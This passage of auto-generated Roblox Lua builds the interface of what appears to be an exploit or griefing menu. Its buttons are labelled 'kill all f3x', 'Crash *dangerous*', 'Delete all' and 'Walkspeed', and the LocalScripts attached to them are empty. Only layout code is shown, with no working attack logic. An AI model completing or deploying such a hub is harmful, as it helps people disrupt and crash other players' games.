-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["46"] = Instance.new("TextButton", G2L["33"]);
G2L["46"]["TextWrapped"] = true;
G2L["46"]["BorderSizePixel"] = 4;
G2L["46"]["TextSize"] = 14;
G2L["46"]["TextScaled"] = true;
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["46"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["46"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["Text"] = [[Lazytown]];
G2L["46"]["Position"] = UDim2.new(0.00965, 0, 0.20845, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["47"] = Instance.new("LocalScript", G2L["46"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["48"] = Instance.new("TextButton", G2L["33"]);
G2L["48"]["TextWrapped"] = true;
G2L["48"]["BorderSizePixel"] = 4;
G2L["48"]["TextSize"] = 14;
G2L["48"]["TextScaled"] = true;
G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["48"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["48"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["Text"] = [[Colour spam all]];
G2L["48"]["Position"] = UDim2.new(0.1273, 0, 0.20845, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["49"] = Instance.new("LocalScript", G2L["48"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["4a"] = Instance.new("TextButton", G2L["33"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["BorderSizePixel"] = 4;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextScaled"] = true;
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["Text"] = [[Meshify parts]];
G2L["4a"]["Position"] = UDim2.new(0.24495, 0, 0.20582, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["4c"] = Instance.new("TextButton", G2L["33"]);
G2L["4c"]["TextWrapped"] = true;
G2L["4c"]["BorderSizePixel"] = 4;
G2L["4c"]["TextSize"] = 14;
G2L["4c"]["TextScaled"] = true;
G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["Text"] = [[Mr bean admin]];
G2L["4c"]["Position"] = UDim2.new(0.36848, 0, 0.20319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["4d"] = Instance.new("LocalScript", G2L["4c"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["4e"] = Instance.new("TextButton", G2L["33"]);
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["BorderSizePixel"] = 4;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextScaled"] = true;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["Text"] = [[Ro-Xploit Tacos]];
G2L["4e"]["Position"] = UDim2.new(0.49348, 0, 0.20056, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["50"] = Instance.new("TextButton", G2L["33"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["BorderSizePixel"] = 4;
G2L["50"]["TextSize"] = 14;
G2L["50"]["TextScaled"] = true;
G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["50"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["Text"] = [[Rain krabby patty]];
G2L["50"]["Position"] = UDim2.new(0.61995, 0, 0.19793, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["51"] = Instance.new("LocalScript", G2L["50"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["52"] = Instance.new("TextButton", G2L["33"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["BorderSizePixel"] = 4;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextScaled"] = true;
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["52"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["Text"] = [[Rain Coikax]];
G2L["52"]["Position"] = UDim2.new(0.74495, 0, 0.20056, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["52"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["54"] = Instance.new("TextButton", G2L["33"]);
G2L["54"]["TextWrapped"] = true;
G2L["54"]["BorderSizePixel"] = 4;
G2L["54"]["TextSize"] = 14;
G2L["54"]["TextScaled"] = true;
G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["54"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["Text"] = [[Invis parts]];
G2L["54"]["Position"] = UDim2.new(0.88024, 0, 0.19529, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["54"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["56"] = Instance.new("TextButton", G2L["33"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["BorderSizePixel"] = 4;
G2L["56"]["TextSize"] = 14;
G2L["56"]["TextScaled"] = true;
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["56"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["Text"] = [[Vis parts]];
G2L["56"]["Position"] = UDim2.new(0.00965, 0, 0.38477, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["57"] = Instance.new("LocalScript", G2L["56"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["58"] = Instance.new("TextButton", G2L["33"]);
G2L["58"]["TextWrapped"] = true;
G2L["58"]["BorderSizePixel"] = 4;
G2L["58"]["TextSize"] = 14;
G2L["58"]["TextScaled"] = true;
G2L["58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["58"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["58"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["Text"] = [[Random transparency]];
G2L["58"]["Position"] = UDim2.new(0.12583, 0, 0.38214, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["58"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["5a"] = Instance.new("TextButton", G2L["33"]);
G2L["5a"]["TextWrapped"] = true;
G2L["5a"]["BorderSizePixel"] = 4;
G2L["5a"]["TextSize"] = 14;
G2L["5a"]["TextScaled"] = true;
G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5a"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["Text"] = [[Obunga]];
G2L["5a"]["Position"] = UDim2.new(0.24642, 0, 0.37951, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["5b"] = Instance.new("LocalScript", G2L["5a"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["5c"] = Instance.new("LocalScript", G2L["5a"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5a"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["5e"] = Instance.new("TextButton", G2L["33"]);
G2L["5e"]["TextWrapped"] = true;
G2L["5e"]["BorderSizePixel"] = 4;
G2L["5e"]["TextSize"] = 14;
G2L["5e"]["TextScaled"] = true;
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["Text"] = [[Toad roast]];
G2L["5e"]["Position"] = UDim2.new(0.36995, 0, 0.37687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["5f"] = Instance.new("LocalScript", G2L["5e"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["60"] = Instance.new("TextButton", G2L["33"]);
G2L["60"]["TextWrapped"] = true;
G2L["60"]["BorderSizePixel"] = 4;
G2L["60"]["TextSize"] = 14;
G2L["60"]["TextScaled"] = true;
G2L["60"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["60"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["60"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["Text"] = [[kill all f3x]];
G2L["60"]["Position"] = UDim2.new(0.49348, 0, 0.37424, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["61"] = Instance.new("LocalScript", G2L["60"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["62"] = Instance.new("TextButton", G2L["33"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BorderSizePixel"] = 4;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextScaled"] = true;
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["62"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["Text"] = [[Big head]];
G2L["62"]["Position"] = UDim2.new(0.61995, 0, 0.37424, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["63"] = Instance.new("LocalScript", G2L["62"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["64"] = Instance.new("TextButton", G2L["33"]);
G2L["64"]["TextWrapped"] = true;
G2L["64"]["BorderSizePixel"] = 4;
G2L["64"]["TextSize"] = 14;
G2L["64"]["TextScaled"] = true;
G2L["64"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["64"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["Text"] = [[Noot Noot!]];
G2L["64"]["Position"] = UDim2.new(0.74495, 0, 0.37424, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["65"] = Instance.new("LocalScript", G2L["64"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["66"] = Instance.new("TextButton", G2L["33"]);
G2L["66"]["TextWrapped"] = true;
G2L["66"]["BorderSizePixel"] = 4;
G2L["66"]["TextSize"] = 14;
G2L["66"]["TextScaled"] = true;
G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["66"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["66"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["Text"] = [[Rain Flaming heads]];
G2L["66"]["Position"] = UDim2.new(0.88024, 0, 0.37161, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["67"] = Instance.new("LocalScript", G2L["66"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["68"] = Instance.new("TextButton", G2L["33"]);
G2L["68"]["TextWrapped"] = true;
G2L["68"]["BorderSizePixel"] = 4;
G2L["68"]["TextSize"] = 14;
G2L["68"]["TextScaled"] = true;
G2L["68"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["68"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["Text"] = [[Anti-sk*d]];
G2L["68"]["Position"] = UDim2.new(0.00965, 0, 0.55582, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["69"] = Instance.new("LocalScript", G2L["68"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["6a"] = Instance.new("TextButton", G2L["33"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["BorderSizePixel"] = 4;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Text"] = [[Grab Knife]];
G2L["6a"]["Position"] = UDim2.new(0.12583, 0, 0.55319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["6b"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["6c"] = Instance.new("TextButton", G2L["33"]);
G2L["6c"]["TextWrapped"] = true;
G2L["6c"]["BorderSizePixel"] = 4;
G2L["6c"]["TextSize"] = 14;
G2L["6c"]["TextScaled"] = true;
G2L["6c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["Text"] = [[John doe]];
G2L["6c"]["Position"] = UDim2.new(0.24642, 0, 0.55319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["6d"] = Instance.new("LocalScript", G2L["6c"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["6e"] = Instance.new("TextButton", G2L["33"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["BorderSizePixel"] = 4;
G2L["6e"]["TextSize"] = 14;
G2L["6e"]["TextScaled"] = true;
G2L["6e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6e"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["Text"] = [[Crash *dangerous*]];
G2L["6e"]["Position"] = UDim2.new(0.36848, 0, 0.55319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["6f"] = Instance.new("LocalScript", G2L["6e"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["70"] = Instance.new("TextButton", G2L["33"]);
G2L["70"]["TextWrapped"] = true;
G2L["70"]["BorderSizePixel"] = 4;
G2L["70"]["TextSize"] = 14;
G2L["70"]["TextScaled"] = true;
G2L["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["70"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["Text"] = [[Skeleton sky]];
G2L["70"]["Position"] = UDim2.new(0.49348, 0, 0.55319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["70"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["72"] = Instance.new("LocalScript", G2L["70"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.UICorner
G2L["73"] = Instance.new("UICorner", G2L["33"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["74"] = Instance.new("TextButton", G2L["33"]);
G2L["74"]["TextWrapped"] = true;
G2L["74"]["BorderSizePixel"] = 4;
G2L["74"]["TextSize"] = 14;
G2L["74"]["TextScaled"] = true;
G2L["74"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["74"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["74"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Text"] = [[Delete all]];
G2L["74"]["Position"] = UDim2.new(0.61912, 0, 0.55319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["75"] = Instance.new("LocalScript", G2L["74"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["76"] = Instance.new("TextButton", G2L["33"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["BorderSizePixel"] = 4;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextScaled"] = true;
G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["76"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["Text"] = [[Disco Partz]];
G2L["76"]["Position"] = UDim2.new(0.74477, 0, 0.55319, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["77"] = Instance.new("LocalScript", G2L["76"]);



-- StarterGui.ScreenGui.Frame.Player Scripts
G2L["78"] = Instance.new("Frame", G2L["2"]);
G2L["78"]["Visible"] = false;
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["78"]["Size"] = UDim2.new(0, 581, 0, 365);
G2L["78"]["Position"] = UDim2.new(0, 0, 0.168, 0);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Name"] = [[Player Scripts]];


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["79"] = Instance.new("TextButton", G2L["78"]);
G2L["79"]["TextWrapped"] = true;
G2L["79"]["BorderSizePixel"] = 4;
G2L["79"]["TextSize"] = 14;
G2L["79"]["TextScaled"] = true;
G2L["79"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["79"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["79"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Text"] = [[Head shake]];
G2L["79"]["Position"] = UDim2.new(0.00965, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["7a"] = Instance.new("LocalScript", G2L["79"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["7b"] = Instance.new("TextButton", G2L["78"]);
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["BorderSizePixel"] = 4;
G2L["7b"]["TextSize"] = 14;
G2L["7b"]["TextScaled"] = true;
G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7b"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["Text"] = [[Chicken arms]];
G2L["7b"]["Position"] = UDim2.new(0.1273, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["7c"] = Instance.new("LocalScript", G2L["7b"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["7d"] = Instance.new("TextButton", G2L["78"]);
G2L["7d"]["TextWrapped"] = true;
G2L["7d"]["BorderSizePixel"] = 4;
G2L["7d"]["TextSize"] = 14;
G2L["7d"]["TextScaled"] = true;
G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7d"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["Text"] = [[Forcefield]];
G2L["7d"]["Position"] = UDim2.new(0.24642, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["7e"] = Instance.new("LocalScript", G2L["7d"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.UICorner
G2L["7f"] = Instance.new("UICorner", G2L["78"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["80"] = Instance.new("TextButton", G2L["78"]);
G2L["80"]["TextWrapped"] = true;
G2L["80"]["BorderSizePixel"] = 4;
G2L["80"]["TextSize"] = 14;
G2L["80"]["TextScaled"] = true;
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["80"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["Text"] = [[Disco character]];
G2L["80"]["Position"] = UDim2.new(0.36267, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["80"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["82"] = Instance.new("TextButton", G2L["78"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["BorderSizePixel"] = 4;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextScaled"] = true;
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["82"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["Text"] = [[Mesh disco]];
G2L["82"]["Position"] = UDim2.new(0.47709, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["83"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["84"] = Instance.new("TextButton", G2L["78"]);
G2L["84"]["TextWrapped"] = true;
G2L["84"]["BorderSizePixel"] = 4;
G2L["84"]["TextSize"] = 14;
G2L["84"]["TextScaled"] = true;
G2L["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["84"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["84"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["Text"] = [[Walkspeed]];
G2L["84"]["Position"] = UDim2.new(0.59176, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["84"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["86"] = Instance.new("TextButton", G2L["78"]);
G2L["86"]["TextWrapped"] = true;
G2L["86"]["BorderSizePixel"] = 4;
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextScaled"] = true;
G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
